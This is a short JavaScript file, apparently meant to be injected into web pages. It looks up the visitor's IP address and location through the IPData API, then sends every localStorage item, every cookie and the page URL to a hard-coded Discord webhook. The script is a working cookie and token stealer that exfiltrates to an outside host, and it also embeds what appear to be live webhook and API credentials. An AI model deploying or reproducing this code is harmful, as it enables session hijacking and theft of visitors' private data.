const webhookURL = "https://discord.com/api/webhooks/1074660620097564672/m94mq1MkmeEa1D4RT3OpiWvWSIZnBp17Y_BiEq7orfq4ekVKJtoXe4Afnlgz8xo805Et";
const ipdataApiKey = "ab98c61b24be9e65bb0c740eb12ced18fc5be6cedcd77b9d417f82b1";

// Get details from IPData API
fetch(`https://api.ipdata.co/?api-key=${ipdataApiKey}`)
  .then(response => response.json())
  .then(data => {
    const details = {
      title: "Details",
      fields: [
        {
          name: "IP Address",
          value: "```" + data.ip + "```",
          inline: true
        },
        {
          name: "Continent",
          value: "```" + data.continent_name + "```",
          inline: true
        },
        {
          name: "Country",
          value: "```" + data.country_name + "```",
          inline: true
        },
        {
          name: "Website",
          value: "[" + window.location.href + "](" + window.location.href + ")",
          inline: true
        },
        {
          name: "Is Threat",
          value: "```" + data.threat.is_threat + "```",
          inline: true
        },
        {
          name: "Is Tor",
          value: "```" + data.threat.is_tor + "```",
          inline: true
        },
        {
          name: "Is Proxy",
          value: "```" + data.threat.is_proxy + "```",
          inline: true
        }
      ]
    };
    
    // Send message with Local Storage Items, Cookies, and Details embeds
    const items = Object.entries({ ...localStorage })
      .map(([name, value]) => ({ name, value: "```" + value + "```" }));
  
    const cookies = document.cookie
      .split("; ")
      .map(cookie => {
        const [name, value] = cookie.split("=");
        return { name, value };
      });
  
    const message = {
      embeds: [
        details,
        {
          title: "Local Storage",
          fields: items
        },
        {
          title: "Cookies",
          fields: cookies.map(cookie => ({
            name: cookie.name,
            value: "```" + cookie.value + "```"
          }))
        }
      ]
    };
  
    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(message)
    })
    .then(response => console.log(response))
    .catch(error => console.error(error));
  })
  .catch(error => console.error(error));
